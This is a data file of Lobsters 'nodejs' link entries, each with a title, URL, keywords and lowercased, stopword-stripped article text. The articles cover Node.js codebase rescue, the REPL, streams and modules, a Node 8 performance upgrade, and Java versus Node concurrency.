194,Lobsters,nodejs,Node.js programming,The Art of the node.js Rescue,https://peterlyons.com/problog/2018/07/the-art-of-the-node-js-rescue,art nodejs rescue,art nodejs rescue first triage repair server basic code even git repository documentation dependency accurately tracked server start run automated unit test foundation automated unit test untested javascript viable deliverable professional software development must establishing pattern antipatterns tracking fixing bug resist temptation rewrite overhaul linting eslintstats side note promise nodejs rescue checklist,art nodejs rescue july recently helping client get nodejs mobile back end api server ready launch new service post outline guideline use brought trueup problematic nodejs codebase first triage repair server basic real rescue effort happen need work fundamental issue get bare minimum working project service code even git repository encountered zip file previous agency delivered step one get existing codebase without new modification initial git commit get pushed git host documentation new developer get git clone running server using readme slack allowed reverse engineer document readme figure come understand basic software stack third party service integration deployment setup etc get documented dependency accurately tracked usually fix packagejson generate new packgelockjson necessary server start run need get milestone even though sound like basic thing project would starting minute lifetime experience many node project get carried away bullshit fancy code handle configuration clustering process supervision fancy logging setup etc often code misguided flat broken ok server start listen http request switch normal course treatment get functioning well automated unit test foundation next phase setting good automated unit test stack day reach tap supertest nock first choice library important point achieve unit test run locally test fast deterministic running partial set test granularity straightforward test runnable devtools debugger main bit work finding right set library helper function setupteardown code make sense service usually test http interface via supertest code call api endpoint via supertest concise enough basically category calling function argument since test coded stable api interface web mobile front end use stable integration point typically overhaul rewrite endpoint implementation without changing http interface usually api endpoint much code really complex endpoint go ahead write unit test various internal implementation function test working locally set continuous integration work pull request integrated github automated unit test put cynical hat moment could sum bulk consultancy come nonunittesting developer get code working writing test yes cynical characterization kernel painful truth javascript language nearzero support writing correct program allows encourages u write code get even basic analysis correctness typical lowquality nodejs server codebase guarantee likely actually upheld every file require dependency graph syntactically valid javascript absolutely nothing beyond guaranteed referenceerrors typeerrors almost guaranteed exist large quantity plague code crashing production clearly never run developer laptop ci one tested qa first execution production server crashing triggered end user putting lesscynical hat mostly still believe welltested nodejs codebase something reasonably deliver client point pragmatic reality offer large set developer able work enormous ecosystem available library good great speed developing feature good great performance runtime excellent tooling throughout software development lifecycle however hold true solid test coverage untested javascript massive liability terribleodds gamble think community working technology stack need take hard clear stance make following statement untested javascript viable deliverable professional software development viable professional javascript must delivered extensive test untested javascript incredibly likely rife bug come enormous cost risk refactoring agency consultant employee need stop delivering client need educated insist working automated test suite running continuous integration system baseline deliverable would say analogous plumber leaving job without ever put running water system establishing pattern antipatterns node server codebase lends boilerplatey pattern repeated across lot endpoint generally set dedicated set example route establish new correct code pattern good example course full unit test coverage idea clean pattern input validation control flow error handling logging etc also usually repeated antipatterns course wellapplied middleware could potentially eliminate whole class boilerplate ideal target often time find little microantipatterns db queried promise used etc code example illustrate broken point corrected pattern applied making change particular endpoint tracking fixing bug unit testing stack solid begin main phase real work going api endpoint identifying bug issue unit test guide work prioritized using whatever information available focus highimportance highfrequency api call first leave ancillary supporting call later key tool include basic logging bug tracking tool optionally error tracking service sentry process loop repeat many time phase look le follows identify potential bug via error log file server crash stack trace specific api response known incorrect file bug issue bug tracker relevant detail understood reproduced reproduce failure unit test sure making change relevant application code reproduced failing test code fix issue guide fix delivery mark resolved resist temptation rewrite overhaul faced nasty codebase one may feel discomfort frustration anxiety state code feeling make following thing really tempting start new codebase entirely bulk update dependency latest update latest nodejs npm drastic modification across entire codebase advice resist temptation activity think serve developer emotion expense value client rewrite discard latent value codebase force client pay scratch development functionality server extreme case reasonable way forward time codebase salvaged make recommendation client rewrite make sure compelling costbenefit analysis side aware sunk cost fallacy factor decision continue existing codebase course need make recommendation client embark rewrite prepare thorough case study specifically first attempt failed failure specifically avoided rewrite goal type rescue make software stable reliable bulk updating dependency almost certainly going introduce novel bug work counter goal fine update specific particular dependency concrete reason updating thing bulk general hygiene appropriate situation without solid unit test indication continued work continued broken fixed broken novel way logic applies updating nodejs version substantial set unit test totally conflict project goal add unit test increase code coverage point becomes safer make broad update change exactly point judgement call recommend conservative erring side test huge fan autoformatting tool prettier eslint fix etc become pretty core work nt worry formatting issue actually typing code hit cmdf trust make code pretty however existing codebase using autoformatter recommend caution would wait automated unit test coverage fairly high considering running autoformatting across entire codebase aware essentially discard existing git history lose track wrote code git blame etc pretty steep tradeoff personally nt value git history much point ok running autoformatter whole codebase sure understand tradeoff making decision valuable history git nt want mess another strategy consider filebyfile extraction code set autoformatted set left untouched linting eslint particularly eslintstats helpful guide however due concern adding bug untested code nt recommend changing code based eslint warningserrors unit test coverage help identify troublesome area code nt go codebase fix eslint issue throughout without unit test coverage side note promise async control flow nodejs hard hard enough many developer never really learn write correctly true callback paradigm promise well however promise particular seem area pervasive misuse misunderstanding every nodejs codebase found us promise incorrect promise usage baked core pattern repeatedly copied throughout codebase community really missed mark promise come education tooling even eslint promise plugin huge number issue plain day eslint plugin found even detects warning optimistic asyncawait take basic mechanism async control flow thing improve easy case series sequential operation however think still mess deal case looping complex control flow pattern nodejs rescue checklist get code git repository document key process readme initial developer setup standard development task flow overview tech stack deployment integration ensure dependency properly tracked documented ensure server start run establish core unit testing stack get test running ci set logging maybe error tracking service set code coverage report set linting track bug bug tracker reproduce bug unit test add unit test get substantial code coverage set autoformatting
195,Lobsters,nodejs,Node.js programming,Node.js REPL in Depth,https://blog.bloomca.me/2018/07/09/nodejs-repl-in-depth.html,nodejs repl depth,repl module object dirname filename underscore variable lodash special command python repl editor official doc automatically imported module core nodejs module f http o path using repl module repl replstart,repl stand readevalprintloop interactive session usually terminal enter expression immediately evaluate seeing result evaluating whole flow repeat work exit process r stand reading command e stand evaluating p stand printing result execution l mean run whole process loop order run nodejs repl need run node command without argument repl session similar console window browser create store variable declare function require module installed dependency check module object however one important difference executing file working repl session repl session wrapped function dirname filename variable require file would existing commonjs file illustrate let create new file export string require repl touch examplejs echo exportssome text examplejs node require example text text assign result require expression able access anyway got last expression result using underscore variable nodejs repl automatically assigns last expression result variable interesting despite popular choice lodash assign variable save value next expression different node something expression assignment disabled something something something else something else something else special command nodejs repl special command even though feel widely known first let look multiline command default every line evaluated type hit enter way javascript tell need continue evaluate code like done python repl example challenging write function since unreadable errorprone type one line however editor command allows type many line need node editor entering editor mode finish c cancel function sum b return b sum type point sum special command official doc break process inputting multiline expression entering break command pressing ctrl c key combination abort input processing expression clear reset repl context empty object clear multiline expression currently input exit close io stream causing repl exit help show list special command save save current repl session file save filetosavejs load load file current repl session load filetoloadjs editor enter editor mode ctrl finish ctrl c cancel automatically imported module hit tab key twice give possible autocompletions also already typed something one option automatically use check available globally keep mind everything declare session also available node tap tab twice array boolean date error evalerror function infinity json math nan number object rangeerror referenceerror regexp string syntaxerror typeerror urierror decodeuri decodeuricomponent encodeuri encodeuricomponent eval isfinite isnan parsefloat parseint undefined arraybuffer atomics buffer dtracehttpclientrequest dtracehttpclientresponse dtracehttpserverrequest dtracehttpserverresponse dtracenetserverconnection dtracenetstreamend dataview global intl map promise proxy reflect set sharedarraybuffer symbol weakmap weakset webassembly assert asynchooks buffer childprocess clearimmediate clearinterval cleartimeout cluster console crypto dgram dns domain escape event f global http http module net o path perfhooks process punycode querystring readline repl require root setimmediate setinterval settimeout stream stringdecoder tl tty unescape url util vm zlib definegetter definesetter lookupgetter lookupsetter proto constructor hasownproperty isprototypeof propertyisenumerable tolocalestring tostring valueof important aside expected global object method automatically access core nodejs module like f http o path big deal might convienent thing especially trying idea repl use imported module special way running nodejs provide e argument following string containing j code evaluated immediately node e consolelog osplatform darwin keep mind mode node print anything console default would wrap code consolelog want see result execution might helpful want enter repl want create separate file using repl module import repl module directly use within nodejs application nodejs default done using replstart method use usual default standard input output stream run interactive shell prompt symbol create small javascript file repl require repl prompt replstart code run file work custom prompt node repljs code const sum args argsreduce b b undefined code sum code exit see command work expected cusomize plently thing feel free play around repl session example add variable scope repl need require repl require repl const r replstart code rcontextenrich obj return objectassign obj prop something function scope available immediately node repljs code enrich num num prop something
196,Lobsters,nodejs,Node.js programming,How to build powerful REST APIs blazingly fast with Node.js,https://resthapi.com/blog/2018/06/26/How-To-Build-Powerful-APIs-Blazingly-Fast-With-Nodejs.html,build powerful rest apis blazingly fast nodejs,medium wild west world standard good practice http githubcomjkheadleyresthapi story scalio tutorial still support relationship overcomplicate thing buddy mine dry journey tightly coupled workable solution npm module hapi result resthapi check twitter facebook linkedin headleyjustin gmailcom,original post found medium let face web developer deal apis whether write use someone else part job rest apis particular common place unfortunately come wild west world javascript nodejs standard good practice writing restful apis sometimes get thrown window easier good enough sometimes take everyone standard might different name video good reason write weak code course exist nonetheless human nature easy take shortcut sometimes tight deadline seems unavoidable trust done well good news better way develop got right toolset enough luck might even discover right way easy way took long time find path discovery hope sharing story might save api consumer heartache skip result section want get directly business visit http githubcomjkheadleyresthapi wild ride story past several year working web developer software consultancy scalio time pleasure learning nodejs working multiple apps serving restful apis first everything seemed great mean google tutorial building restful api nodejs find ton article video server running minute wow stuff easy thought least long started running issue oh want payload validation query parameter document endpoint really copy paste route handler wait want use mongodb still support relationship programming nodejs extremely flexible mean even simple task solved many different way unfortunately mean developer free overcomplicate thing tend wonder api development get hand feature request start piling quickly turn ugly mess especially trying coordinate developer king sanity working several project together buddy mine awesome developer came implemented great idea generating restful endpoint based data model immediately loved spending time focusing structure business logic app rather writing crud endpoint time needed new functionality like filtering get request write endpoint felt like dry api paradise knew journey soon completed project started looking could take created make useful tool original solution worked well tightly coupled project still lacked good amount functionality spent day brainstorming rewriting code seemed like huge amount effort finally workable solution however like beginning pretty embarrassing tool worked existed framework clone directly github eww developer forced design project around framework still lacked lot functionality even compared original solution feel tho luckily thing getting started still hope dream project officially public ever slowly began gain interest magic open source came life developer gave feedback submitted issue even began contribute long major improvement made turning project npm module hapi server plugin also amazing opportunity thanks scalio develop use tool within real world project always believed core concept project exciting usefulness validated experience yes improved felt really tapped goldmine restful api development resulting code consistent robust easy follow previously took day week develop could done hour result resthapi nearly two year hard work development excited introduce resthapi web development community able pack lot useful feature tool far including generating endpoint locally querying user collection populating userrole relationship goal start develop tool would allow developer build powerful rest apis minimal overhead believe done still plenty hope dream future project proud accomplished tool kind nope fit every situation course useful hoping check decide love hear feedback like feel free give star github future post go detail design philosophy behind resthapi along handson example use build awesome rest apis want get touch reach twitter facebook linkedin email headleyjustin gmailcom hope enjoyed post thanks reading
197,Lobsters,nodejs,Node.js programming,Cheq - a command-line checklist app (for mac/win/lin/node),https://github.com/tomhodgins/cheq,cheq commandline checklist app macwinlinnode,cheq commandline checklist app installation release function list tag add remove check uncheck rename,cheq commandline checklist app commandline checklist simple textbased ui adding listing removing tagging checking renaming checklist item installation software available node module npm well prebuilt binary window mac linux available github release tab install cheq globally npm enter shell npm install g cheq function list cheq list keyword example cheq list cheq list cheq list tagged work cheq list tagged work cheq list checked cheq list unchecked list function display checklist item default use special keyword display list checklist item tagged term list checklist item tagged one space separated tag checked unchecked display checklist item matching status tag cheq tag id keyword example cheq tag grocery using tag function supply checklist item id along desired tag adding tag checklist item twice remove tag add cheq add title example cheq add new checklist item use add function followed text create new checklist item text nt worry change text existing item using rename function remove cheq remove keyword cheq remove id example cheq remove cheq remove tagged work cheq remove tagged work cheq remove checked cheq remove unchecked cheq remove using remove function remove individual checklist item id set item matching keywords tagged one tag supplied checked unchecked action irreversible check cheq check id example cheq check check function change status checklist item show checked list function accepts individual id uncheck cheq uncheck id example cheq uncheck uncheck function change status checklist item show unchecked list function accepts individual id rename cheq rename id title example cheq rename new title rename function take id existing checklist item replaces current title new title
199,Lobsters,nodejs,Node.js programming,Node.js Guide for Frontend Developers,https://blog.bloomca.me/2018/06/21/nodejs-guide-for-frontend-developers.html,nodejs guide frontend developer,nodechakracore table content npm script bundlers test runner node version release schedule nvm virtualenv rbenv babel needed almost everything tail recursion jsx transformation bleeding edge transformation nodemon callback style callback hell promise asyncawait fsreadfile utilspromisify promisified file system module event loop promiseresolve compatibility reason browser official nodejs doc event emitter eventemitter publishsubscribe pattern response object request object stream many others stream eventemitter writable stream writable stream fscreatereadstream readable stream duplex transform stream different latency backpressure pipe method pause resume module system commonjs module ecmascript module actually wrap nodepath requirecache environment variable twelvefactor app environment variable crossenv bashzsh profile processenv putting everything together http conclusion repl,guide focused frontend developer people know javascript proficient node yet focus language nodejs us interpreter google chrome probably know however possible run different vms see nodechakracore table content deal nodejs pretty often nowadays even frontend developer npm script webpack configuration gulp task programmatic run bundlers test runner even though really need deep understanding sort task might confusing sometimes cause write something weird way missing key concept nodejs familiarity node also allow automate thing manually feeling confident looking serverside code writing complicated script node version shocking difference clientside code fact decide runtime absolutely sure supported feature choose version going use depending requirement available server nodejs public release schedule tell u odd version longterm support current lts longterm support version actively developed april maintained critical update december new version node actively developed bring lot new feature along security update performance improvement might good reason use current active version however nobody really force want nothing wrong use older version avoid update good moment nodejs used extensively modern frontend toolchain hard imagine modern project include processing using node tool might already familiar nvm node version manager allows several node version installed time choosing correct version project reason tool different project often written using different node version want constantly keep sync want preserve environment written tested tool exist many language like virtualenv python rbenv ruby babel needed free choose nodejs version big chance use lts long term supported version moment writing support almost everything ecmascript spec except tail recursion mean need babel unless stuck old version nodejs need jsx transformation live without bleeding edge transformation practice crucial running code written without transpiling gift already forgot clientside also need webpack browserify therefore tool reload code case develop something like web server use nodemon reload application filechanges ship code anywhere need minify one step le use code feel really weird callback style historically asynchronous function nodejs accepted callback signature err data first argument represented error null good otherwise handle error handler called action done response example let read file f require f fsreadfile myfilejs err file err consoleerror error reading file process global object node http nodejsorgapiprocesshtml processprocessexitcode processexit something file content discovered soon style make extremely hard write readable maintainable code even created notion callback hell later new asynchronous primitive introduced promise standardized ecmascript global object browser nodejs runtime recently ecmascript asyncawait standartized became available nodejs use lts version promise avoid callback hell get problem old code lot builtin module still use technique however hard convert promise illustrate let convert fsreadfile promise f require f function readfile argument return new promise resolve reject fsreadfile argument err data err reject err else resolve data pattern easily extended function special function builtin utils module utilspromisify example official documentation util require util const f require f const stat utilpromisify fsstat stat stats something stats catch error handle error nodejs core team understands need move old style trying introduce promisified version builtin module promisified file system module already although experimental moment writing still encounter lot oldschool nodejs code callback recommended wrap using utilspromisify sake consistency event loop event loop almost browser extension however since topic little bit advanced cover fully difference highlight though know part nodejsspecific event loop nodejs javascript built asynchronous behaviour mind therefore often execute everything right list thing executed direct order example immediately resolved promise like promiseresolve mean code executed event loop iteration synchronous code nodejs specific thing exist browser well process object behaves like microtask priority mean executed right synchronous code even microtasks introduced dangerous lead endless loop naming unfortunate since executed event loop iteration next tick compatibility reason probably remain exist browser reach consistent behaviour across careful using browser similar settimeout code sometimes take precedence naming also best talking next event loop iteration really immediate timer behave way node browser one important thing timer delay provide guaranteed time callback executed really mean nodejs execute callback time soon main execution cycle finished operation including microtasks timer higher priority let take look example mentioned thing put correct output script execution want try go javascript interpreter f require f consolelog beginning program const promise new promise resolve function passed promise constructor executed synchronously consolelog promise function resolve resolved message promisethen consolelog first resolved promise consolelog second resolved promise processnexttick consolelog process next tick fsreadfile indexhtml consolelog settimeout consolelog callback settimeout delay setimmediate consolelog setimmediate callback settimeout consolelog callback settimeout delay setimmediate consolelog setimmediate callback correct execution order following node eventloopjs beginning program promise function process next tick first resolved promise second resolved promise callback settimeout delay setimmediate callback setimmediate callback callback settimeout delay read event loop processnexttick official nodejs doc event emitter lot core module nodejs emit receive different event nodejs implementation eventemitter publishsubscribe pattern similar browser dom event slightly different syntax easiest thing understand actually implement eventemitter constructor thisevents checkexistence event thisevents event thisevents event event cb thischeckexistence event const cbwithremove args cb args thisoff event cbwithremove thisevents event push cbwithremove event cb thischeckexistence event thisevents event push cb event cb thischeckexistence event thisevents event thisevents event filter registeredcallback registeredcallback cb emit event args thischeckexistence event thisevents event foreach cb cb args implementation show pattern target exact functionality please use code basic code need allows subscribe event unsubscribe later emit different event example response object request object stream actually extend implement eventemitter simple concept implemented lot npm package many others want use event emitter browser feel free use stream stream node best misunderstood idea dominic tarr stream allow process data chunk result full operation like reading file understand need let show simple example let say want return user requested file arbitrary size code might look like req re const filename requrlslice fsreadfile filename err data err resstatuscode resend something went wrong else resend data code work especially local dev machine might fail see issue problem case file big read file put everything memory enough resource work also work case lot concurrent request keep data object memory sent everything however really need file return file system look inside content read part return immediately free memory repeat whole thing done description stream nutshell mechanism receive data chunk decide data example exactly req re const filename requrlslice const filestream fscreatereadstream filename encoding let result filestreamon data chunk result chunk filestreamon end resend result file exist error callback called filestreamon error resstatuscode resend something went wrong create stream read file stream implement eventemitter class data event receive next chunk end event get signal stream ended full file read implementation work wait whole file read return response also problem keep whole file memory sending back solve problem know response object implement writable stream write information stream without keeping memory req re const filename requrlslice const filestream fscreatereadstream filename encoding filestreamon data chunk reswrite chunk filestreamon end resend file exist error callback called filestreamon error resstatuscode resend something went wrong response object implement writable stream fscreatereadstream creates readable stream also duplex transform stream difference work exactly scope tutorial good know existence need result variable anymore write alredy read chunk response immediately keep memory mean read even big file worry lot parallel request since keep file memory run however one problem solution read one stream filesystem reading file write another network request two thing different latency different mean really different time response stream overwhelmed since much slower problem description backpressure node solution readable stream pipe method redirects data given stream respecting load busy pause original stream resume using method simplify code req re const filename requrlslice const filestream fscreatereadstream filename encoding filestreampipe re file exist error callback called filestreamon error resstatuscode resend something went wrong stream changed several time node history extra careful reading old manual always check official documentation module system nodejs us commonjs module probably already used every time use require get module inside webpack configuration actually use commonjs module every time declare moduleexports use well however might also seen something like exportssome without module section see exactly work first talk commonjs module regular j extension esmmjs file ecmascript module allow use importexport syntax also important understand webpack browserify bundling tool use require function please confused touch aware slightly different even though behaves similar fashion actually get global object like module require export actually nodejs runtime add instead executing given javascript file actually wrap function variable export require module filename dirname module see wrapper executing following snippet commandline e consolelog require module wrapper variable injected module available global one even though really global highly recommend look especially module variable call consolelog module javascript file try compare result print main file required one next let look export object small example showing caveat related name work export name name nt work moduleexports name name work example might puzzle answer nature export object argument passed function case assign new object rewrite variable old reference gone fully gone though moduleexports object actually reference single object export true last part require function take module name return export object module exactly resolve module pretty straightforward rule check core module provided name path begin try resolve file file found try find directory indexjs file path begin go nodemodules check folderfile folder run script one level reach nodemodules also place mostly compatibility also provide path look specifying variable nodepath might useful want see exact order nodemodules resolved print module object script look path property print following tmp node testjs module id export parent null filename userssevazaikovtmptestjs loaded false child path userssevazaikovtmpnodemodules userssevazaikovnodemodules usersnodemodules nodemodules another interesting thing require first require call module cached executed get back cached export object mean logic sure executed first require call exactly true remove module id requirecache module might reloaded required environment variable stated twelvefactor app good practice store configuration environment variable set variable shell session myvariable variable value node crossplatform engine ideally application possible run platform eg development choose production environment run code usually linux distributive example cover macoslinux work window syntax environment variable window different use something like crossenv keep mind case well add line bashzsh profile set new terminal session however usually run application providing variable specifically instance secretkey secret key value node serverjs access variable nodejs app using processenv object config db processenvappdburi secret processenvsecretkey putting everything together example create simple http server return file named provided url string case file exist return found error case user try cheat use relative nested path send error used function really document time heavilydocumented code require builtin module nodejs traverse nodemodules folder http nodejsorgapihttphtml httphttpcreateserveroptionsrequestlistener const createserver require http const f require f const url require url const path require path pas folder name file environment variable use different folder locally const foldername processenvfoldername const port processenvport const server createserver req re requrl contains full url querystring ignored want ensure get pathname without querystring http nodejsorgapihttphtml httpmessageurl const parsedurl urlparse requrl nt need first symbol const pathname parsedurlpathnameslice order return response call resend http nodejsorgapihttphtml httpresponseenddataencodingcallback method responseend must called response nt call connection wo nt close requester wait timeout default return response code http enwikipediaorgwikilistofhttpstatuscodes case something went wrong supposed return correct status code using resstatuscode property http nodejsorgapihttphtml httpresponsestatuscode pathnamestartswith resstatuscode resend relative path allowed else pathnameincludes resstatuscode resend nested path allowed else http nodejsorgendocsguidesworkingwithdifferentfilesystems order stay crossplatform ca nt create path use platformspecific separator delimiter pathjoin exactly u http nodejsorgapipathhtml pathpathjoinpaths const filepath pathjoin dirname foldername pathname const filestream fscreatereadstream filepath filestreampipe re filestreamon error e handle nonexistant file plenty possible error code get common code doc http nodejsorgapierrorshtml errorscommonsystemerrors ecode enoent resstatuscode resend file exist else resstatuscode resend internal server error serverlisten port consolelog application listening port port conclusion guide covered lot fundamental nodejs principle dive specific apis definitely missed part guide good starting point feel confident reading api editing existing creating new script able understand error interface builtin module use expect typical nodejs object interface next time cover web server using nodejs depth nodejs repl write cli application use nodejs small script subscribe get notification new article
200,Lobsters,nodejs,Node.js programming,Upgrading to Node v8 has significantly reduced our operating costs,https://blog.ably.io/how-our-gross-margin-is-improving-after-upgrading-from-node-6-to-node-8-bdf59e654b86,upgrading node significantly reduced operating cost,bet well supported open source project like google following upgrade nodejs bet paid latency consistent global infrastructure server cost gone almost ably realtime load performance le spikey predictable bang buck vastly improved circa real world saving performance improvement well known google turbofan ignition performance matter bet technology engineering muscle drive continuously optimize ably realtime grpc cassandra golang additional note redundancy every layer service significant change node concurrent marking,bet well supported open source project like google following upgrade nodejs bet paid latency consistent global infrastructure server cost gone almost ably realtime distributed pubsub messaging platform use wide array technology realtime stack including elixir go nodejs whilst nodejs often first choice new service core routing frontend layer built nodejs spite well known shortcoming continues serve u well whilst continuously optimizing infrastructure running cost always tradeoff allocating engineering resource focus new revenue feature v reducing cost optimizing performance majority case high growth tech business revenue growth focus lie fortunately though bet number underlying technology incredibly well supported community continue get material cost reduction without much engineering effort case point recent nodejs upgrade effect seen two significant improvement load performance le spikey predictable graph see cluster containing node busiest time saw node spiking nearly brief period spite mean cpu utilization sitting around mark nodejs busy cluster show intermittent spike across nodesyet completed upgrade nodejs comparable load cluster see far predictable performance without spike nodejs busy cluster demonstrates consistent even performancewe speculate change underlying responsible reality javascript engine improving many front specifically compiler runtime garbage collector collectively play part bang buck vastly improved circa real world saving performed load testing lab nodejs v nodejs saw said region increase performance surprising performance improvement well known however tested one isolated cluster servicing real world production traffic benefit far significant whilst google turbofan ignition gave u ability increase rate operation underlying hardware improvement mentioned made performance predictably smooth node gave u confidence regard true spare capacity cluster able run le node condition see one busier cluster running nodejs able reduce raw server cost circa server usage hour single cluster nodejs performance matter bet technology engineering muscle drive continuously optimize whilst benefit experienced upgrade could considered lucky win u see way building internetscale system without googlescale resource requires strategic approach technology choice focus project community engineer focused improving performance bound luck along way started scratch today probably using nodejs extensively use however started ably realtime chose nodejs core routing layer provided u technology well suited high io workload also encouraged rapid development cycle time technology performed well versus similar technology google engineone bet took choosing nodejs time would continue get faster significantly surprise course given google engine used chrome browser since average around line code changing week engine mammoth amount effort highly skilled engineering team line code addeddeleted engine repository weekwe made similar bet technology chosen also large group contributor focused feature also continuous performance optimization grpc rpc layer sponsored google cassandra persistence layer golang network service worker additional note astute reader may wondering took long upgrade node year underlying reason provide service customer expect u time approach third party dependency possible use stable well supported version case node lts version officially released end realized time back likely reason would able honor uptime aim would due software fault hardware infrastructure network fault infrastructure redundancy every layer service able ensure continuity spite hardware network failure however infrastructure offer protection software fault deployed globally localize change infrastructure per region basis minimize impact change software change however come dependency upgrade always tread carefully practical understand depth change made upstream result approach dependency update slower requires testing deployed stage one instance one cluster onto global service allows u measure impact change dependency term latency error resource utilization decide roll widely rising stack kindly summarized significant change node node looking like going significantly improve gc performance result concurrent marking post update change land lts version node matthew ceo cofounder ably realtime
201,Lobsters,nodejs,Node.js programming,"Speaking Intelligently about ""Java vs Node"" Performance",https://rclayton.silvrback.com/speaking-intelligently-about-java-vs-node-performance,speaking intelligently java v node performance,tl dr nt write benchmark comparing two performance nt consideration perrequest latency consistently reasonably individual server handle reasonable amount simultaneous request developer productivity far important important save couple hundred dollar month achieving better server utilization take engineer significantly longer deliver feature speaking intelligently performance java time faster node serving web request would nt confused implementation benchmark idiomatic language used performance nt everything java process concurrency model http thread big deal deadlocking java modify double integer atomically java concurrency practice node process concurrency model concurrency really simple reason node node clustering care viable platform majority use case engineer java almost always faster nodejs thing make java fast also make beast work java one write script run nodejs opinion faster learn develop c c python ruby php javascript websiteapi web service enterprise security simple worker queue big data analytic scientific computing etc etc etc many request per second expect maximum acceptable average request latency environmental constraint get away scaling vice cost effectively find hire developer skillset exciting new recruit conclusion note nodewebworkerthreads source http enwikipediaorgwikideadlock http dzonecomarticleslongdoublearenotatomicinjava,tl dr unless know difference process concurrency model java node nt write benchmark comparing two silly know difference misleading nt deciding two platform understand performance nt consideration well designed architecture utilize multiple server simply need redundancy make perinstance capacityperformance le important reached threshold monthly server maintenance cost outweigh development cost said perrequest latency consistently reasonably meaning average request served quickly say le individual server handle reasonable amount simultaneous request second would argue developer productivity far important speed underlying vm think important save couple hundred dollar month achieving better server utilization take engineer significantly longer deliver feature would argue better optimize developer costpermonth server utilization case java v node pick one think deliver overall value team keep mind performance one factor calculus speaking intelligently performance last couple year noticed bunch asinine comparison java node generally come form java time faster node read fine print serving web request generally attribute kind propaganda java holdout nt understand someone might want leave jvm platform something else however finding question asked often place like quora case people truly curious platform need make decision instance seeing lot conversation like following going invest lot time learning new language java node thinking migrating away railsphp architecture would best future really like nodejs worried eventually rewrite node service java performance reason would nt confused quick google search show myriad article pitting java node article take time explain difference process concurrency model language great however many incredibly biased towards one language top benchmark find typically written someone lot experience one language begs question implementation benchmark idiomatic language used think final point make performance nt everything u know make point emphasizing however going humor performance argument explaining process concurrency model difference language answer high level question might java process concurrency model java application tend ran single process within process application utilize independent thread execution perform task parallel typical java web server us hundred thousand thread request server typically handled thread modern java web server generally nonblocking meaning yield control execution back processor wait background thread complete task typically io related like connecting database huge advancement especially since blocking execution major criticism java web server nodejs first came sorry ca nt use excuse anymore class primethread extends thread long minprime primethread long minprime thisminprime minprime public void run compute prime larger minprime somewhere else another file primethread p new primethread pstart example spawning thread java taken oracle documentation http thread big deal conceptually many actively executing thread cpu core single java process web server application utilize cpu core computer allocate one thread another kind advantage thread share memory mean access variable created one thread another whereas separate process make coordination communication thread extremely fast simply access variable process memory space shared access memory thread also great problem since multiple thread access memory time completely possible create scenario application state becomes inconsistent due concurrent modification access one scenario deadlocking process two competing thread indefinitely stalled independently locked resource reliant upon mean state need handled synchronous fashion requires coordination thread around kind state boundary review java documentation lock synchronize etc common consequence poor state synchronization dirty mutation java completely possible two thread modify long double time one changing significant least significant happens java modify double integer atomically simply put use java write nearrealtime stupid fast application really hard right book like java concurrency practice teaching developer use platform correctly node process concurrency model node hand taken different approach concurrency reflected process model node process consists one main thread execution myriad background thread typically performing io work coordination background thread main thread performed using queue main thread pull task queue enqueued order received executes call function result asynchronous background operation callback supplied placed queue operation finished node developer nt ever think queue also nt ever think another thread trampling state change variable happen main thread mean concurrency really simple reason node simplicity come cost though node one main thread execution code ca nt spin new thread work carried background main thread continues executing instead parallelism node achieved process node cluster library node clustering node clustering essentially mean forking new child process handle task forking basically operating system process forking little plumbing added node allow parent child process communicate via interprocess communication ipc process share mean process need bootstrapped state state passed parent one thing nodejs however load balance request tcp server port eg http server something often missed benchmark like request per second comparison may seem annoying fork new process get parallelism actually quite simple powerful importantly enforces safer practice handling state synchronization using message passing instead lock semaphore example node cluster documentation const cluster require cluster const http require http const numcpus require o cpu length clusterismaster fork worker var numcpus clusterfork clusteron exit worker code signal changed line affected syntax highlighting consolelog worker workerprocesspid died else worker share tcp connection case http server httpcreateserver req re reswritehead resend hello worldn listen nt want write clustering code even better option process manager nodejs framework managing nodejs anything run shell process allows start process cluster mode via command line option configuration number instance usually number cpu available start serverjs point achieve greater concurrency nodejs might lead believe people care understand little bit concurrency process model nodejs java next question care fact matter viable platform majority use case engineer however circumstance though java appropriate instance building realtime system use java nodejs java almost always faster nodejs unless used stupidly sharing memory amongst thread lot faster ipc also java virtual machine something like year development runtime java also statically typed precompiled byte code however thing make java fast also make beast work deal static typing overly verbose syntax longest time lack firstclass function lack firstclassfunctions made asynchronous programming painful compilation also take time painful dissect problem like conflicting dependency concurrency model also hard get right troubleshooting synchronization issue real pain also java one write script run lot involved node barrier entry particularly writing executing script much much lower make nodejs opinion faster learn develop especially use case something webrelated take year master java especially building highly concurrent application make use concurrency library available language java also huge ecosystem make awesome comfortable language need something cool like natural language processing machine learning distributed computing etc also scary hell newbie considering platform definitely consider lot performance making decision kind language team comfortable c c java probably easier pick python ruby php javascript node probably easier kind application want build websiteapi nodejs easier use faster develop supporting modern single page application plus isomorphic javascript pretty awesome feature reap using nodefrontend javascript web service enterprise security java much better support enterprisy framework simple worker queue probably easier use nodejs task performing queue supporting api written node basically probably nt want use nodejs call command line perform task like video processing native java binding big data analytic java whole lot library support currently present nodejs ecosystem also java better handling cpubound task scientific computing java historically better library scientific computing includes better native support large number precision arithmetic etc etc etc going list permutation thing build language point probably choose language based thing want build rather syntax concurrency construct provided platform term performance many request per second expect maximum acceptable average request latency environmental constraint allowed one server performance profile machine mobile device much load application put device get away scaling vice argument favor java performance reason tends go away application scaled horizontally especially true nowadays development time expensive renting server resource alternatively untrue huge number server facebook google twitter cost optimizing platform le expensive development cost perform optimization easy recruit platform cost effectively find hire developer skillset issue java average salary developer much higher concentration developer skillset tends regional exciting new recruit say general people would excited learn develop node conclusion use common sense making decision choosing platform consider team going using walk benefit disadvantage platform make decision sure find cut dry java faster node note third party module providing threading implementation nodewebworkerthreads library however standard part platform arguably idiomatic nodejs exact true linux thread implemented process share memory parent source http enwikipediaorgwikideadlock http dzonecomarticleslongdoublearenotatomicinjava
202,Lobsters,nodejs,Node.js programming,A secure TypeScript runtime on V8,https://github.com/ry/deno,secure typescript runtime,join github today sign file permalink reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign branch commit ahead commits behind denoland master file permalink failed load latest commit information type name latest commit message commit time perform action time signed another tab window reload refresh session signed another tab window reload refresh session
203,Lobsters,nodejs,Node.js programming,10 Things I Regret About Node.js,https://www.youtube.com/watch?v=M3BM9TB-8yA,thing regret nodejs,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature thing regret nodejs ryan dahl jsconf eu youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature thing regret nodejs ryan dahl jsconf eu youtube
